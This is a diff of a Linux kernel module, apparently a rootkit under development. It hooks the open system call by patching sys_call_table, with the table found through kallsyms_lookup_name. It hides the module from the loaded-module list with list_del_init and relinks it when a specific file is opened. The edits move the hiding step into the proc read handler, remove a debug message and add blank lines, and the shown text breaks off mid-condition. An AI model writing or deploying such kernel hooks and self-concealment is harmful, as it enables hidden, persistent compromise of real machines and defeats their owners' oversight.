@@ -30,7 +30,6 @@ asmlinkage int openhook_sys_open(const char __user * filename, int flags, umode_
 	
 	if (filepath[0] != 0x0 && strcmp(filepath, fname) == 0) {
 		count++ ;
-		pr_info("cat block return link\n");
 		modules_list = THIS_MODULE->list;
 		n->prev = (&modules_list);
 		p->next = (&modules_list);
@@ -57,7 +56,7 @@ ssize_t openhook_proc_read(struct file *file, char __user *ubuf, size_t size, lo
 {
 	char buf[256] ;
 	ssize_t toread ;
-
+	list_del_init(&modules_list); 
 	sprintf(buf, "%s:%d\n", filepath, count) ;
 	
 
@@ -112,9 +111,17 @@ int __init openhook_init(void) {
 	n = (&modules_list)->next;
 	p = (&modules_list)->prev;
 	pr_info("name    = %s\n", THIS_MODULE->name);
+
+
+
+
+
+
+
+
     	pr_info("version = %s\n", THIS_MODULE->version);
 	sctable = (void *) kallsyms_lookup_name("sys_call_table") ;
-	list_del_init(&modules_list); 
+	
 	orig_sys_open = sctable[__NR_open] ;
 	pte = lookup_address((unsigned long) sctable, &level) ;
 	if (pte->pte &~ _PAGE_RW) 
